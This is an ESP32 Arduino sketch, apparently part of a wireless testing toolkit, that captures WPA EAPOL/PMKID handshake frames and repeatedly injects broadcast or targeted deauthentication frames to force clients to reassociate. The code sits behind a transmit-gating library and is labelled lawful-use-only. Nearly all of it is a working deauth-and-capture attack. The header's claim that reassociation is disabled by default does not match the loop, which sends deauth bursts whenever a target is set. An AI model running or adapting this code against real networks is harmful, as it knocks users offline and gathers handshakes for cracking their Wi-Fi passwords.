/*
 * medusa_pmkid — research-only WPA association-flow capture harness.
 *
 * The prototype pins an authorized lab channel, observes EAPOL frames, and can
 * request reassociation for controlled defense testing. The host parser creates
 * local interoperability artifacts; synthetic parser proof is distinct from a
 * live capture or receiver-effect claim.
 *
 * Active reassociation is disabled by default and excluded from the product
 * until the threat model's scope, rate, duration, audit, confirmation, and stop
 * controls exist and have physical tests.
 */
#include <Arduino.h>
#include <WiFi.h>
#include <string.h>
#include "esp_wifi.h"
#include "medusa_tx_common.h"

#if defined(__has_include)
#  if __has_include("medusa_target.h")
#    include "medusa_target.h"
#  endif
#endif
#ifndef TARGET_CHANNEL
#define TARGET_CHANNEL 0
#endif
#ifndef TARGET_BSSID
#define TARGET_BSSID { 0, 0, 0, 0, 0, 0 }
#endif
#ifndef TARGET_CLIENT
#define TARGET_CLIENT { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF }
#endif

static uint8_t bssid[6] = TARGET_BSSID;
static uint8_t client[6] = TARGET_CLIENT;

#define SLOTS 16
#define SLOT_LEN 256
struct Rec { int16_t rssi; uint16_t len; uint8_t data[SLOT_LEN]; };
static Rec ring[SLOTS];
static volatile uint32_t head = 0, tail = 0;
static volatile uint32_t eapolSeen = 0, dropped = 0;
static const char HEXC[] = "0123456789abcdef";

static bool is_eapol(const uint8_t* d, int len) {
  if (len < 26 || ((d[0] >> 2) & 0x3) != 2) return false;   // data frames only
  for (int i = 24; i + 1 < len && i <= 40; i++)
    if (d[i] == 0x88 && d[i + 1] == 0x8e) return true;
  return false;
}

static void onRx(void* buf, wifi_promiscuous_pkt_type_t type) {
  const wifi_promiscuous_pkt_t* p = (const wifi_promiscuous_pkt_t*)buf;
  int len = p->rx_ctrl.sig_len;
  const uint8_t* d = p->payload;
  if (!is_eapol(d, len)) return;
  eapolSeen++;
  uint32_t nh = (head + 1) % SLOTS;
  if (nh == tail) { dropped++; return; }
  int n = len > SLOT_LEN ? SLOT_LEN : len;
  ring[head].rssi = p->rx_ctrl.rssi; ring[head].len = n;
  memcpy(ring[head].data, d, n);
  head = nh;
}

/* 26-byte deauth: reason 7. dir=true → to STA (from AP); false → to AP (from STA). */
static uint8_t deauth[26];
static void send_deauth(const uint8_t* sta, bool toSta) {
  int n = 0;
  deauth[n++] = 0xC0; deauth[n++] = 0x00; deauth[n++] = 0x00; deauth[n++] = 0x00;
  if (toSta) { for (int i = 0; i < 6; i++) deauth[n++] = sta[i]; for (int i = 0; i < 6; i++) deauth[n++] = bssid[i]; }
  else       { for (int i = 0; i < 6; i++) deauth[n++] = bssid[i]; for (int i = 0; i < 6; i++) deauth[n++] = sta[i]; }
  for (int i = 0; i < 6; i++) deauth[n++] = bssid[i];      // BSSID
  deauth[n++] = 0x00; deauth[n++] = 0x00;                  // seq
  deauth[n++] = 0x07; deauth[n++] = 0x00;                  // reason 7
  // The one transmission this capability makes: a nudge to provoke the
  // reassociation whose handshake we are trying to observe. It passes the
  // same gate as any other frame, so a capture run cannot transmit outside
  // the operator's scope, rate or session.
  if (medusa_tx_send(deauth, (size_t)n, bssid, millis()) < 0) {
    Serial.printf("pmkid: nudge refused (%s)\n", mtg_decision_code(medusa_tx_last_decision()));
  }
}

static bool tx_session_ready = false;

static void tx_session_start(const uint8_t *target) {
  mcfg_t cfg;
  mcfg_defaults(&cfg);
  uint8_t allow[1][MTG_MAC_LEN];
  memcpy(allow[0], target, MTG_MAC_LEN);
  mtg_session_grant_t grant;
  tx_session_ready = medusa_tx_begin(&cfg, MCFG_PROFILE_DEAUTH, allow, 1, false, millis(), &grant);
  if (!tx_session_ready) {
    Serial.println("TX refused: no session (a stop may be latched, or scope is missing).");
    return;
  }
  Serial.printf("TX session: %lu ms, %u frames/sec\n",
                (unsigned long)grant.duration_ms, (unsigned)grant.rate_per_sec);
}

static bool configured() {
  if (!TARGET_CHANNEL) return false;
  for (int i = 0; i < 6; i++) if (bssid[i]) return true;
  return false;
}

void setup() {
  Serial.begin(115200);
  delay(600);
  Serial.println("\n=== medusa_pmkid ===");
  Serial.println("LAWFUL USE ONLY - your own AP / authorized tests.");
  WiFi.mode(WIFI_STA);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&onRx);
  if (!configured()) { Serial.println("No target set -> idle."); return; }
  esp_wifi_set_channel(TARGET_CHANNEL, WIFI_SECOND_CHAN_NONE);
  Serial.printf("PMKID/handshake capture -> AP %02X:%02X:%02X:%02X:%02X:%02X ch %d (forcing reassoc)\n",
                bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], TARGET_CHANNEL);
  tx_session_start(bssid);
}

void loop() {
  static char line[SLOT_LEN * 2 + 40];
  // drain captured EAPOL frames to the host
  while (tail != head) {
    Rec* r = &ring[tail];
    int n = snprintf(line, sizeof(line), "PKT\t%d\t%u\t", r->rssi, r->len);
    for (int i = 0; i < r->len; i++) { line[n++] = HEXC[r->data[i] >> 4]; line[n++] = HEXC[r->data[i] & 0xf]; }
    line[n] = 0; Serial.println(line);
    tail = (tail + 1) % SLOTS;
  }
  if (!configured()) { delay(1000); return; }
  // periodically force reassociation to elicit M1/PMKID + the 4-way
  static uint32_t lastDeauth = 0, lastStat = 0;
  bool bcast = true; for (int i = 0; i < 6; i++) if (client[i] != 0xFF) { bcast = false; break; }
  if (millis() - lastDeauth > 1500) {
    lastDeauth = millis();
    if (bcast) { uint8_t b[6]; memset(b, 0xFF, 6); for (int k = 0; k < 8; k++) send_deauth(b, true); }
    else { for (int k = 0; k < 6; k++) { send_deauth(client, true); send_deauth(client, false); } }
  }
  if (millis() - lastStat > 2000) { lastStat = millis(); Serial.printf("STAT\teapol=%u dropped=%u\n", eapolSeen, dropped); }
  delay(15);
}
